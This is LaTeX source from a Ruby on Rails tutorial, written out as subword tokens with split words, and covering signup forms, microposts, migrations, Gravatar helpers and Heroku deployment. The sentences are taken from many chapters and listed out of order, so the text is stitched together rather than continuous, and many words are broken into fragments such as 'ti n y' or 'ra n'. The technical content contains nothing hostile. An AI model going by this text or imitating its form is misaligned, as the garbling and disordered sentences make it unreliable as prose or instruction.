▁To ▁ prepare ▁the ▁system ▁for ▁deployment ▁to ▁production , ▁we ▁run ▁\ k ode { bundle ▁install } ▁with ▁a ▁special ▁flag ▁to ▁prevent ▁the ▁local ▁installation ▁of ▁any ▁production ▁gems ▁( which ▁in ▁this ▁case ▁consist s ▁of ~\ text tt { p g } ▁and ▁\ text tt { rails \_ 12 factor }) :
▁The ▁first ▁step ▁is ▁to ▁\ href { http :// signup . heroku . com /}{ sign ▁up ▁for ▁Heroku }.
▁To ▁see ▁your ▁new ly ▁deploy ed ▁application , ▁visit ▁the ▁address ▁that ▁you ▁saw ▁when ▁you ▁ ra n ▁\ k ode { heroku ▁create } ▁( i . e . , ▁Listing ~\ ref { code : heroku _ create }).
▁In ▁the ▁next ▁chapter , ▁we ' ll ▁build ▁on ▁the ▁foundation ▁from ▁Chapter ~\ ref { cha : beginning } ▁to ▁make ▁a ▁database - back ed ▁\ emph { toy ▁app }, ▁which ▁will ▁give ▁us ▁our ▁first ▁real ▁taste ▁of ▁what ▁Rails ▁can ▁do .
▁Change ▁the ▁content ▁of ▁the ▁\ k ode { hello } ▁action ▁in ▁Listing ~\ ref { code : hello _ action } ▁to ▁read ▁`` hola , ▁ mundo ! ''
▁\ emph { Extra ▁c r edit } : ▁Show ▁that ▁Rails ▁supports ▁non - \ href { http :// es . wiki p edia . org / wiki / ASCII }{ ASCII } ▁characters ▁by ▁including ▁an ▁in ve r t ed ▁excl am ation ▁point , ▁as ▁in ▁`` ¡ H ol a , ▁ mundo ! ''
▁By ▁following ▁the ▁example ▁of ▁the ▁\ k ode { hello } ▁action ▁in ▁Listing ~\ ref { code : hello _ action }, ▁add ▁a ▁second ▁action ▁called ▁\ k ode { goodbye } ▁that ▁render s ▁the ▁text ▁`` goodbye , ▁world ! ''.
▁We ▁first ▁saw ▁microposts ▁in ▁ l ar v al ▁form ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁and ▁in ▁this ▁chapter ▁we ▁will ▁make ▁a ▁full - strength ▁version ▁of ▁the ▁sketch ▁from ▁Section ~\ ref { sec : microposts _ resource } ▁by ▁construct ing ▁the ▁Micropost ▁data ▁model , ▁associat ing ▁it ▁with ▁the ▁User ▁model ▁using ▁the ▁\ k ode { has \_ many } ▁and ▁\ k ode { belongs \_ to } ▁methods , ▁and ▁the n ▁making ▁the ▁forms ▁and ▁partials ▁needed ▁to ▁manipulate ▁and ▁display ▁the ▁results ▁( including , ▁in ▁Section ~\ ref { sec : micropost _ images }, ▁uploaded ▁images ).
▁In ▁Chapter ~\ ref { cha : following _ users }, ▁we ' ll ▁complete ▁our ▁ti n y ▁Twitter ▁ clone ▁by ▁adding ▁the ▁not ion ▁of ▁\ emph { following } ▁users ▁in ▁order ▁to ▁receive ▁a ▁\ emph { feed } ▁of ▁their ▁microposts .
▁Even ▁though ▁the ▁content ▁will ▁be ▁restrict ed ▁to ▁few er ▁than ▁ 140 ▁characters ▁( Section ~\ ref { sec : micropost _ validations }) ▁and ▁hence ▁would ▁fit ▁inside ▁the ▁2 5 5 - character ▁\ k ode { string } ▁type , ▁using ▁\ k ode { text } ▁better ▁express es ▁the ▁nature ▁of ▁microposts , ▁which ▁are ▁more ▁natural ly ▁though t ▁of ▁as ▁blocks ▁of ▁text .
▁The ▁model ▁tests ▁should ▁now ▁be ▁\ passing :
▁The ▁first ▁of ▁these ▁was ▁included ▁automatically ▁by ▁the ▁migration ▁in ▁Listing ~\ ref { code : micropost _ migration } ▁via ▁\ k ode { belongs \_ to ▁: user }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ belongs _ to _ user }.
▁Of ▁course , ▁after ▁this ▁minor ▁refactoring ▁the ▁test ▁suite ▁should ▁ still ▁be ▁\ passing :
▁Because ▁the ▁application ▁code ▁was ▁working , ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁In ▁this ▁section , ▁we ' ll ▁also ▁see ▁the ▁first ▁hint ▁of ▁a ▁\ emph { status ▁feed }--- a ▁not ion ▁ br ough t ▁to ▁full ▁f ru it ion ▁in ▁Chapter ~\ ref { cha : following _ users }.
▁In ▁Chapter ~\ ref { cha : sign _ up }, ▁we ▁implemented ▁user ▁signup ▁by ▁making ▁an ▁HTML ▁form ▁that ▁issue d ▁an ▁HTTP ▁\ text tt { POST } ▁request ▁to ▁the ▁\ k ode { create } ▁action ▁in ▁the ▁Users ▁controller .
▁At ▁this ▁point , ▁all ▁the ▁tests ▁should ▁be ▁\ passing :
▁The ▁result ▁of ▁adding ▁these ▁ additional ▁check s ▁appears ▁in ▁Listing ~\ ref { code : jquery _ file _ test }.
▁We ' ll ▁learn ▁how ▁to ▁model ▁such ▁user ▁relationships , ▁and ▁see ▁the ▁implications ▁for ▁the ▁microposts ▁feed , ▁in ▁Chapter ~\ ref { cha : following _ users }.
▁We ' ll ▁use ▁an ▁HTML ▁\ emph { form } ▁to ▁submit ▁user ▁signup ▁information ▁to ▁our ▁application ▁( Section ~\ ref { sec : signup _ form }), ▁which ▁will ▁the n ▁be ▁used ▁to ▁create ▁a ▁new ▁user ▁and ▁save ▁its ▁attributes ▁to ▁the ▁database ▁( Section ~\ ref { sec : successful _ signup s }).
▁In ▁this ▁chapter , ▁we ' ll ▁rely ▁on ▁the ▁User ▁model ▁validations ▁from ▁Chapter ~\ ref { cha : modeling _ users } ▁to ▁increase ▁the ▁odd s ▁of ▁new ▁users ▁ having ▁valid ▁email ▁addresses .
▁In ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }, ▁we ' ll ▁make ▁\ emph { s ure } ▁of ▁email ▁validity ▁by ▁adding ▁a ▁separate ▁\ emph { account ▁activation } ▁step ▁to ▁user ▁signup .
▁Ou r ▁eventual ▁goal ▁for ▁the ▁user ▁profile ▁pages ▁is ▁to ▁show ▁the ▁user ' s ▁profile ▁image , ▁basic ▁user ▁data , ▁and ▁a ▁list ▁of ▁microposts , ▁as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : profile _ mockup }
▁We ' ll ▁complete ▁this ▁task , ▁and ▁with ▁it ▁the ▁sample ▁application , ▁in ▁Chapter ~\ ref { cha : following _ users }.
▁A ▁mockup ▁of ▁the ▁user ▁profile ▁made ▁in ▁this ▁section .
▁A ▁mockup ▁of ▁our ▁best ▁guess ▁at ▁the ▁final ▁profile ▁page .
▁As ▁you ▁can ▁see , ▁Rails ▁provides ▁a ▁\ text tt { Rails } ▁object ▁with ▁an ▁\ text tt { env } ▁attribute ▁and ▁ associated ▁environment ▁boolean ▁methods , ▁so ▁that , ▁for ▁example , ▁\ text tt { Rails . env . test ?}\ ▁returns ▁\ text tt { true } ▁in ▁a ▁test ▁environment ▁and ▁\ text tt { false } ▁otherwise .
▁To ▁make ▁the ▁debug ▁output ▁look ▁nice , ▁we ' ll ▁add ▁some ▁rules ▁to ▁the ▁custom ▁stylesheet ▁created ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : mixin _ and _ debug }.
▁This ▁introduce s ▁the ▁Sass ▁\ emph { mixin } ▁facilit y , ▁in ▁this ▁case ▁called ▁\ k ode { box \_ s i z ing }.
▁The ▁sample ▁application ▁Home ▁page ▁with ▁debug ▁information .
▁The ▁result ing ▁correspond ence ▁of ▁URLs , ▁actions , ▁and ▁named ▁routes ▁is ▁show n ▁in ▁Table ~\ ref { table : RESTful _ users }.
▁RESTful ▁routes ▁provided ▁by ▁the ▁Users ▁resource ▁in ▁Listing ~\ ref { code : users _ resource }.
▁The ▁URL ▁/ users /1 ▁with ▁routing ▁but ▁no ▁page .
▁in ▁Listing ~\ ref { code : user _ show _ action } ▁find s ▁the ▁user ▁with ▁id ~\ text tt {1} .
▁The ▁user ▁show ▁page ▁after ▁adding ▁a ▁Users ▁resource .
▁Ou r ▁plan ▁is ▁to ▁define ▁a ▁\ k ode { gravatar \_ for } ▁helper ▁function ▁to ▁return ▁a ▁Gravatar ▁image ▁for ▁a ▁given ▁user , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ show _ view _ with _ gravatar }.
▁By ▁default , ▁methods ▁defined ▁in ▁any ▁helper ▁file ▁are ▁automatically ▁available ▁in ▁any ▁view , ▁but ▁for ▁convenience ▁we ' ll ▁put ▁the ▁\ k ode { gravatar \_ for } ▁method ▁in ▁the ▁file ▁for ▁helpers ▁ associated ▁with ▁the ▁Users ▁controller .
▁( Because ▁of ▁the ▁email ▁downcas ing ▁callback ▁in ▁Listing ~\ ref { code : email _ downcase }, ▁this ▁will ▁ never ▁make ▁a ▁difference ▁in ▁this ▁tutorial , ▁but ▁it ' s ▁a ▁good ▁practice ▁in ▁case ▁the ▁\ k ode { gravatar \_ for } ▁ever ▁get s ▁used ▁on ▁email ▁addresses ▁from ▁other ▁source s .)
▁The ▁result ing ▁\ k ode { gravatar \_ for } ▁helper ▁appears ▁in ▁Listing ~\ ref { code : gravatar _ for _ helper }.
▁Defin ing ▁a ▁\ k ode { gravatar \_ for } ▁helper ▁method .
▁The ▁user ▁profile ▁page ▁with ▁the ▁default ▁Gravatar .
▁Listing ~\ ref { code : side bar _ css } ▁includes ▁the ▁\ k ode { . gravatar \_ edit } ▁class , ▁which ▁we ' ll ▁put ▁to ▁work ▁in ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }.
▁The ▁current ▁state ▁of ▁the ▁signup ▁page ▁\ href { http :// localhost :3000/ signup }{/ signup }.
▁A ▁mockup ▁of ▁the ▁user ▁signup ▁page .
▁We ▁can ▁accomplish ▁this ▁in ▁Rails ▁with ▁the ▁\ k ode { form \_ for } ▁helper ▁method , ▁which ▁take s ▁in ▁an ▁Active ▁Record ▁object ▁and ▁construct s ▁a ▁form ▁using ▁the ▁object ' s ▁attributes .
▁Recall ing ▁that ▁the ▁signup ▁page ▁/ signup ▁is ▁route d ▁to ▁the ▁\ k ode { new } ▁action ▁in ▁the ▁Users ▁controller ▁( Listing ~\ ref { code : signup _ route }), ▁our ▁first ▁step ▁is ▁to ▁create ▁the ▁User ▁object ▁required ▁as ▁an ▁argument ▁to ▁\ k ode { form \_ for }.
▁( Note ▁the ▁reuse ▁of ▁the ▁\ k ode { box \_ s i z ing } ▁ mixin ▁from ▁Listing ~\ ref { code : mixin _ and _ debug }. )
▁We ' ll ▁first ▁look ▁at ▁the ▁out er ▁structure , ▁which ▁consist s ▁of ▁ embedded ▁Ruby ▁open ing ▁with ▁a ▁call ▁to ▁\ k ode { form \_ for } ▁and ▁ closing ▁with ▁\ k ode { end } :
▁The ▁presence ▁of ▁the ▁\ k ode { do } ▁keyword ▁indicates ▁that ▁\ k ode { form \_ for } ▁take s ▁a ▁block ▁with ▁one ▁variable , ▁which ▁we ' ve ▁called ▁\ k ode { f } ▁( for ▁`` form '') .
▁A ▁ filled - in ▁form ▁with ▁\ k ode { text } ▁and ▁\ k ode { password } ▁fields .
▁See ▁\ href { http :// stack overflow . com / questions / 9 4 1 59 4 / un d ers t and - rails - authenticity - token }{ the ▁S t ac k ▁Over flow ▁entry ▁on ▁the ▁Rails ▁ authenticity ▁token } ▁if ▁you ' re ▁interest ed ▁in ▁the ▁details ▁of ▁how ▁this ▁works .
▁A ▁mockup ▁of ▁the ▁signup ▁failure ▁page .
▁This ▁list ing ▁includes ▁a ▁second ▁use ▁of ▁the ▁\ k ode { render } ▁method , ▁which ▁we ▁first ▁saw ▁in ▁the ▁context ▁of ▁partials ▁( Section ~\ ref { sec : partial s }) ; ▁as ▁you ▁can ▁see , ▁\ k ode { render } ▁works ▁in ▁controller ▁actions ▁as ▁well .
▁Signup ▁failure .
▁Signup ▁failure ▁debug ▁information .
▁This ▁hash ▁get s ▁passed ▁to ▁the ▁Users ▁controller ▁as ▁part ▁of ▁\ k ode { params }, ▁and ▁we ▁saw ▁starting ▁in ▁Section ~\ ref { sec : a _ users _ resource } ▁that ▁the ▁\ k ode { params } ▁hash ▁contains ▁information ▁about ▁each ▁request . ▁In ▁the ▁case ▁of ▁a ▁URL ▁like ▁/ users /1 , ▁the ▁value ▁of ▁\ k ode { params [: id ]} ▁is ▁the ▁\ k ode { id } ▁of ▁the ▁corresponding ▁user ▁(\ k ode {1} ~ in ▁this ▁example ).
▁P re v ious ▁versions ▁of ▁Rails ▁used ▁a ▁method ▁called ▁\ k ode { attr \_ accessible } ▁in ▁the ▁\ emph { model } ▁layer ▁to ▁solve ▁this ▁problem , ▁and ▁you ▁may ▁ still ▁see ▁that ▁method ▁in ▁ le g ac y ▁Rails ▁applications , ▁but ▁as ▁of ▁Rails ~4.0 ▁the ▁preferred ▁technique ▁is ▁to ▁use ▁so - called ▁\ emph { strong ▁parameters } ▁in ▁the ▁controller ▁layer .
▁To ▁facilit ate ▁the ▁use ▁of ▁these ▁parameters , ▁it ' s ▁conventional ▁to ▁introduce ▁an ▁aux i li ary ▁method ▁called ▁\ k ode { user \_ params } ▁( which ▁returns ▁an ▁appropriate ▁initialization ▁hash ) ▁and ▁use ▁it ▁in ▁place ▁of ▁\ k ode { params [: user ]} :
▁S ince ▁\ k ode { user \_ params } ▁will ▁only ▁be ▁used ▁internally ▁by ▁the ▁Users ▁controller ▁and ▁need ▁not ▁be ▁expose d ▁to ▁external ▁users ▁via ▁the ▁web , ▁we ' ll ▁make ▁it ▁\ emph { private } ▁using ▁Ruby ' s ▁\ k ode { private } ▁keyword , ▁as ▁show n ▁in ▁Listing ~\ ref { code : create _ action _ strong _ parameters }.
▁By ▁the ▁way , ▁the ▁extra ▁level ▁of ▁indentation ▁on ▁the ▁\ k ode { user \_ params } ▁method ▁is ▁design ed ▁to ▁make ▁it ▁ visual ly ▁apparent ▁which ▁methods ▁are ▁defined ▁after ▁\ k ode { private }.
▁Here ▁the ▁\ k ode { errors . full \_ messages } ▁object ▁( which ▁we ▁saw ▁brief ly ▁before ▁in ▁Section ~\ ref { sec : presence _ validation }) ▁contains ▁an ▁array ▁of ▁error ▁messages .
▁To ▁display ▁the ▁messages ▁in ▁the ▁browser , ▁we ' ll ▁render ▁an ▁error - messages ▁partial ▁on ▁the ▁user ▁\ k ode { new } ▁page ▁while ▁adding ▁the ▁CSS ▁class ▁\ k ode { form - control } ▁( which ▁has ▁special ▁meaning ▁to ▁Bootstrap ) ▁to ▁each ▁entry ▁field , ▁as ▁show n ▁in ▁Listing ~\ ref { code : f _ error _ messages }.
▁Noti ce ▁here ▁that ▁we ▁\ k ode { render } ▁a ▁partial ▁called ▁\ k ode { ' shared / error \_ messages ' } ; ▁this ▁reflect s ▁the ▁common ▁Rails ▁convention ▁of ▁using ▁a ▁d ed icated ▁\ k ode { shared / } ▁directory ▁for ▁partials ▁expected ▁to ▁be ▁used ▁in ▁views ▁across ▁multiple ▁controllers .
▁We ▁see ▁here ▁that ▁the ▁\ k ode { empty ?}\ ▁method , ▁which ▁we ▁first ▁saw ▁in ▁Section ~\ ref { sec : objects _ and _ message _ passing } ▁in ▁the ▁context ▁of ▁strings , ▁also ▁works ▁on ▁Rails ▁error ▁objects , ▁return ing ▁\ k ode { true } ▁for ▁an ▁empty ▁object ▁and ▁\ k ode { false } ▁otherwise .
▁In ▁addition , ▁after ▁an ▁invalid ▁submission ▁Rails ▁automatically ▁wrap s ▁the ▁fields ▁with ▁errors ▁in ▁\ k ode { div } s ▁with ▁the ▁CSS ▁class ▁\ k ode { field \_ with \_ errors }.
▁Because ▁the ▁messages ▁are ▁generated ▁by ▁the ▁model ▁validations , ▁they ▁will ▁automatically ▁change ▁if ▁you ▁ever ▁change ▁your ▁mind ▁about , ▁say , ▁the ▁format ▁of ▁email ▁addresses , ▁or ▁the ▁minimum ▁length ▁of ▁passwords .
▁F a il ed ▁signup ▁with ▁error ▁messages .
▁To ▁get ▁started , ▁we ▁first ▁generate ▁an ▁integration ▁test ▁file ▁for ▁sign ing ▁up ▁users , ▁which ▁we ' ll ▁call ▁\ k ode { users \_ signup } ▁( a do p ting ▁the ▁controller ▁convention ▁of ▁a ▁plural ▁resource ▁name ) :
▁Here ▁\ k ode { User . count } ▁is ▁\ k ode { 0 } ▁because ▁we ▁reset ▁the ▁database ▁at ▁the ▁beginning ▁of ▁Section ~\ ref { sec : signup _ form }.
▁As ▁in ▁Section ~\ ref { sec : layout _ link _ tests }, ▁we ' ll ▁use ▁\ k ode { assert \_ select } ▁to ▁test ▁HTML ▁elements ▁of ▁the ▁relevant ▁pages , ▁tak ing ▁care ▁to ▁check ▁only ▁elements ▁unlike ly ▁to ▁change ▁in ▁the ▁future .
▁In ▁order ▁to ▁test ▁the ▁form ▁submission , ▁we ▁need ▁to ▁issue ▁a ▁\ text tt { POST } ▁request ▁to ▁the ▁\ k ode { users \_ path } ▁( Table ~\ ref { table : RESTful _ users }), ▁which ▁we ▁can ▁do ▁with ▁the ▁\ k ode { post } ▁function :
▁A lthough ▁the ▁two ▁are ▁equivalent , ▁using ▁\ k ode { assert \_ no \_ difference } ▁is ▁clean er ▁and ▁is ▁more ▁idiomatic ally ▁correct ▁Ruby .
▁We ' ve ▁also ▁included ▁a ▁call ▁to ▁\ k ode { assert \_ template } ▁to ▁check ▁that ▁a ▁failed ▁submission ▁re - render s ▁the ▁\ k ode { new } ▁action .
▁A ▁test ▁for ▁an ▁invalid ▁signup .
▁A ▁mockup ▁of ▁successful ▁signup .
▁The ▁application ▁code , ▁which ▁introduce s ▁the ▁\ k ode { redirect \_ to } ▁method , ▁appears ▁in ▁Listing ~\ ref { code : user _ create _ action }.
▁This ▁is ▁because ▁Rails ▁automatically ▁infer s ▁from ▁\ k ode { redirect \_ to ▁@ user } ▁that ▁we ▁want ▁to ▁redirect ▁to ▁\ k ode { user \_ url (@ user ) }.
▁( If ▁instead ▁you ▁get ▁an ▁error ▁message ▁indicat ing ▁that ▁the ▁email ▁address ▁has ▁already ▁been ▁take n , ▁be ▁sure ▁to ▁run ▁the ▁\ k ode { db : migrate : reset } ▁Rake ▁task ▁as ▁indicate d ▁in ▁Section ~\ ref { sec : signup _ form } ▁and ▁restart ▁the ▁development ▁webserver .)
▁The ▁results ▁of ▁a ▁successful ▁user ▁signup , ▁with ▁flash ▁message .
▁The ▁flash - less ▁profile ▁page ▁after ▁a ▁browser ▁reload .
▁here ▁we ' ll ▁use ▁the ▁corresponding ▁\ k ode { assert \_ difference } ▁method :
▁In c or p or at ing ▁\ k ode { assert \_ difference } ▁into ▁the ▁file ▁from ▁Listing ~\ ref { code : a _ test _ for _ invalid _ submission } ▁yields ▁the ▁test ▁show n ▁in ▁Listing ~\ ref { code : a _ test _ for _ valid _ submission }.
▁Note ▁that ▁we ' ve ▁used ▁the ▁\ k ode { post \_ via \_ redirect } ▁variant ▁to ▁post ▁to ▁the ▁users ▁path .
▁A ▁test ▁for ▁a ▁valid ▁signup .
▁A lthough ▁we ▁started ▁deploying ▁our ▁application ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁this ▁is ▁the ▁first ▁time ▁it ▁will ▁actually ▁\ emph { do } ▁something , ▁so ▁we ' ll ▁take ▁this ▁opportunit y ▁to ▁make ▁the ▁deployment ▁p rofessional - grade .
▁A lthough ▁we ▁could ▁use ▁SSL ▁on ▁just ▁the ▁signup ▁page , ▁it ' s ▁actually ▁easier ▁to ▁implement ▁it ▁site - wide , ▁which ▁has ▁the ▁ additional ▁benefit s ▁of ▁ sec ur ing ▁user ▁login ▁( Chapter ~\ ref { cha : log _ in _ log _ out }) ▁and ▁making ▁our ▁application ▁imm un e ▁to ▁a ▁ critical ▁\ emph { session ▁ hijack ing } ▁ vulnerabilit y ▁discuss ed ▁in ▁Section ~\ ref { sec : remember _ me }.
▁As ▁show n ▁in ▁Listing ~\ ref { code : ssl _ in _ production }, ▁all ▁we ▁need ▁to ▁do ▁is ▁set ▁the ▁\ k ode { config } ▁variable ▁to ▁force ▁the ▁use ▁of ▁SSL ▁in ▁production .
▁In ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁we ▁will ▁complete ▁our ▁authentication ▁machinery ▁by ▁allow ing ▁users ▁to ▁log ▁in ▁and ▁out ▁of ▁the ▁application .
▁In ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }, ▁we ▁will ▁allow ▁all ▁users ▁to ▁update ▁their ▁account ▁information , ▁and ▁we ▁will ▁allow ▁site ▁administrator s ▁to ▁delete ▁users , ▁there by ▁com p let ing ▁the ▁full ▁suite ▁of ▁Users ▁resource ▁REST ▁actions ▁from ▁Table ~\ ref { table : RESTful _ users }.
▁The ▁\ k ode { form \_ for } ▁helper ▁is ▁used ▁to ▁make ▁forms ▁for ▁interact ing ▁with ▁Active ▁Record ▁objects .
▁Verify ▁that ▁the ▁code ▁in ▁Listing ~\ ref { code : gravatar _ option } ▁allows ▁the ▁\ k ode { gravatar \_ for } ▁helper ▁defined ▁in ▁Section ~\ ref { sec : a _ gravatar _ image } ▁to ▁take ▁an ▁optional ▁\ k ode { size } ▁parameter , ▁allow ing ▁code ▁like ▁\ k ode { gravatar \_ for ▁user , ▁size : ▁50 } ▁in ▁the ▁view .
▁How ▁ detailed ▁you ▁want ▁to ▁make ▁your ▁tests ▁is ▁up ▁to ▁you ; ▁a ▁suggest ed ▁ ul t ra - mini ma list ▁template ▁appears ▁in ▁Listing ~\ ref { code : flash _ test }, ▁which ▁you ▁should ▁complete ▁by ▁replacing ▁\ k ode { FILL \_ IN } ▁with ▁the ▁appropriate ▁code .
▁Verify ▁by ▁running ▁the ▁test ▁suite ▁that ▁the ▁clean er ▁code ▁in ▁Listing ~\ ref { code : layout _ flash _ content _ tag }, ▁which ▁uses ▁the ▁Rails ▁\ k ode { content \_ tag } ▁helper , ▁also ▁works .
▁ Adding ▁an ▁options ▁hash ▁in ▁the ▁\ k ode { gravatar \_ for } ▁helper .
▁The ▁\ k ode { flash } ▁ERb ▁in ▁the ▁site ▁layout ▁using ▁\ k ode { content \_ tag }.
▁A ▁direct ▁test ▁the ▁\ k ode { full \_ title } ▁helper .
▁Check ing ▁for ▁this ▁requires ▁the ▁use ▁of ▁the ▁`` not '' ▁operator ▁( Section ~\ ref { sec : objects _ and _ message _ passing }), ▁written ▁using ▁an ▁excl am ation ▁point ~\ k ode { ! } \ ▁and ▁usually ▁read ▁as ▁`` bang ''.
▁in ▁Listing ~\ ref { code : re al _ user _ fixture }.
▁By ▁ filling ▁in ▁the ▁missing ▁elements ▁in ▁Listing ~\ ref { code : login _ create _ user _ instance } ▁and ▁Listing ~\ ref { code : i mprov ed _ remember _ me _ test } ▁( indicat ed ▁with ▁question ▁mark s ~\ k ode { ?}\ ▁and ▁\ k ode { FILL \_ IN }), ▁complete ▁this ▁improve d ▁test ▁of ▁the ▁`` remember ▁me '' ▁checkbox .
▁In ▁Chapter ~\ ref { cha : filling _ in _ the _ layout }, ▁we ▁end ed ▁with ▁a ▁ stub ▁page ▁for ▁creating ▁new ▁users ▁( Section ~\ ref { sec : user _ signup }).
▁In ▁Chapter ~\ ref { cha : sign _ up }, ▁we ' ll ▁give ▁users ▁the ▁ability ▁to ▁sign ▁up ▁for ▁our ▁site ▁and ▁create ▁a ▁user ▁profile ▁page .
▁On ce ▁users ▁can ▁sign ▁up , ▁we ' ll ▁let ▁them ▁log ▁in ▁and ▁log ▁out ▁as ▁well ▁( Chapter ~\ ref { cha : log _ in _ log _ out }), ▁and ▁in ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users } ▁( Section ~\ ref { sec : requiring _ logged _ in _ users }) ▁we ' ll ▁learn ▁how ▁to ▁protect ▁pages ▁from ▁i mp r o p er ▁access .
▁F inally , ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset } ▁we ' ll ▁add ▁account ▁activation ▁( the re by ▁confirm ing ▁a ▁valid ▁email ▁address ) ▁and ▁password ▁resets .
▁Take n ▁together , ▁the ▁material ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁through ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset } ▁develop s ▁a ▁full ▁Rails ▁login ▁and ▁authentication ▁system .
▁By ▁using ▁an ▁email ▁address ▁as ▁the ▁username , ▁we ▁open ▁the ▁possibility ▁of ▁communicat ing ▁with ▁our ▁users ▁at ▁a ▁future ▁date ▁( Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }).
▁In ▁Listing ~\ ref { code : example _ user }, ▁we ▁did ▁this ▁with ▁Ruby ' s ▁\ k ode { attr \_ accessor } ▁method :
▁One ▁of ▁the ▁results ▁of ▁the ▁\ k ode { generate } ▁command ▁in ▁Listing ~\ ref { code : generate _ user _ model } ▁is ▁a ▁new ▁file ▁called ▁a ▁\ emph { migration }.
▁In ▁the ▁case ▁of ▁the ▁User ▁model , ▁the ▁migration ▁is ▁created ▁automatically ▁by ▁the ▁model ▁generation ▁ script ; ▁it ▁creates ▁a ▁\ k ode { users } ▁table ▁with ▁two ▁columns , ▁\ k ode { name } ▁and ▁\ k ode { email }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : users _ migration }.
▁In ▁the ▁case ▁of ▁Listing ~\ ref { code : users _ migration }, ▁\ k ode { change } ▁uses ▁a ▁Rails ▁method ▁called ▁\ k ode { create \_ table } ▁to ▁create ▁a ▁table ▁in ▁the ▁database ▁for ▁storing ▁users .
▁The ▁\ k ode { create \_ table } ▁method ▁accept s ▁a ▁block ▁( Section ~\ ref { sec : block s }) ▁with ▁one ▁block ▁variable , ▁in ▁this ▁case ▁called ▁\ k ode { t } ▁( for ▁`` table '') .
▁The ▁User ▁data ▁model ▁produce d ▁by ▁Listing ~\ ref { code : users _ migration }.
▁Under ▁the ▁hood , ▁this ▁command ▁execute s ▁the ▁\ k ode { drop \_ table } ▁command ▁to ▁remove ▁the ▁users ▁table ▁from ▁the ▁database .
▁The ▁reason ▁this ▁works ▁is ▁that ▁the ▁\ k ode { change } ▁method ▁know s ▁that ▁\ k ode { drop \_ table } ▁is ▁the ▁inverse ▁of ▁\ k ode { create \_ table }, ▁which ▁means ▁that ▁the ▁ rollback ▁migration ▁can ▁be ▁easily ▁inferred .
▁We ' ve ▁seen ▁how ▁the ▁User ▁model ▁generation ▁in ▁Listing ~\ ref { code : generate _ user _ model } ▁generated ▁a ▁migration ▁file ▁( Listing ~\ ref { code : users _ migration }), ▁and ▁we ▁saw ▁in ▁F igure ~\ ref { fig : sqlite _ database _ browser } ▁the ▁results ▁of ▁running ▁this ▁migration : ▁it ▁updated ▁a ▁file ▁called ▁\ k ode { development . sqlite 3 } ▁by ▁creating ▁a ▁table ▁\ k ode { users } ▁with ▁columns ▁\ k ode { id }, ▁\ k ode { name }, ▁\ k ode { email }, ▁\ k ode { created \_ at }, ▁and ▁\ k ode { updated \_ at }.
▁As ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby }, ▁our ▁tool ▁of ▁choice ▁for ▁explor ing ▁data ▁models ▁is ▁the ▁Rails ▁console .
▁In ▁the ▁console ▁session ▁in ▁Section ~\ ref { sec : a _ user _ class }, ▁we ▁created ▁a ▁new ▁user ▁object ▁with ▁\ k ode { User . new }, ▁which ▁we ▁ha d ▁access ▁to ▁only ▁after ▁requiring ▁the ▁example ▁user ▁file ▁in ▁Listing ~\ ref { code : example _ user }.
▁In ▁Section ~\ ref { sec : a _ user _ class }, ▁we ▁design ed ▁the ▁example ▁User ▁class ▁to ▁take ▁an ▁\ emph { i nitialization ▁hash } ▁to ▁set ▁the ▁object ▁attributes ; ▁that ▁design ▁choice ▁was ▁motivate d ▁by ▁Active ▁Record , ▁which ▁allows ▁objects ▁to ▁be ▁initialize d ▁in ▁the ▁same ▁way :
▁You ▁may ▁have ▁notice d ▁that ▁the ▁new ▁user ▁object ▁ha d ▁\ k ode { nil } ▁values ▁for ▁the ▁\ k ode { id } ▁and ▁the ▁magic ▁columns ▁\ k ode { created \_ at } ▁and ▁\ k ode { updated \_ at } ▁attributes .
▁As ▁we ' ll ▁see ▁in ▁Chapter ~\ ref { cha : sign _ up }, ▁it ' s ▁often ▁convenient ▁to ▁make ▁and ▁save ▁a ▁model ▁in ▁two ▁steps ▁as ▁we ▁have ▁above , ▁but ▁Active ▁Record ▁also ▁let s ▁you ▁combine ▁them ▁into ▁one ▁step ▁with ▁\ k ode { User . create } :
▁S ince ▁we ▁will ▁be ▁using ▁email ▁addresses ▁as ▁username s , ▁this ▁sort ▁of ▁\ k ode { find } ▁will ▁be ▁useful ▁when ▁we ▁learn ▁how ▁to ▁let ▁users ▁log ▁in ▁to ▁our ▁site ▁( Chapter ~\ ref { cha : sign _ up }).
▁If ▁you ' re ▁ w or r i ed ▁that ▁\ k ode { find \_ by } ▁will ▁be ▁in efficient ▁if ▁there ▁are ▁a ▁large ▁number ▁of ▁users , ▁you ' re ▁a head ▁of ▁the ▁game ; ▁we ' ll ▁cover ▁this ▁issue , ▁and ▁its ▁solution ▁via ▁database ▁indices , ▁in ▁Section ~\ ref { sec : uniqueness _ validation }.
▁The ▁\ k ode { update \_ attributes } ▁method ▁is ▁an ▁alias ▁for ▁the ▁short er ▁\ k ode { update } ▁method , ▁but ▁I ▁prefer ▁the ▁longer ▁version ▁because ▁of ▁its ▁similar ity ▁to ▁the ▁singular ▁version ▁of ▁the ▁method , ▁\ k ode { update \_ attribute }.
▁The ▁\ k ode { update \_ attributes } ▁method ▁accept s ▁a ▁hash ▁of ▁attributes , ▁and ▁on ▁ success ▁perform s ▁both ▁the ▁update ▁and ▁the ▁save ▁in ▁one ▁step ▁( return ing ▁\ k ode { true } ▁to ▁indicate ▁that ▁the ▁save ▁we n t ▁through ).
